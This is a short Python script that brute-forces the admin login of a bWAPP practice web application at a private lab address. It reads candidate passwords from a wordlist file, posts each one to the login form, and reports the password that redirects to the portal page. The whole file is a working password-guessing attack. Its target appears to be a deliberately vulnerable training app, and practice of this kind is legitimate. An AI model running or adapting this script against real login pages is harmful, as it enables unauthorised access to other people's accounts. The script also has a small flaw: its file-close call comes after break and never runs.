import requests

inputFile = input("Choose File: ")
readPasswords = open(inputFile, "r")

url = "http://192.168.100.155/bWAPP/login.php"

for trying in readPasswords:

	credintials = {
		'login': 'admin',
		'security_level': 0,
		'form': 'submit',
		'password': ''
	}

	credintials['password'] = trying.strip()

	response = requests.post(url, data = credintials)

	if response.url == "http://192.168.100.155/bWAPP/portal.php":
		print("Password is: {}".format(trying))
		break
		readPasswords.close()
	else:
		print("{} Failed ...".format(trying.strip()))

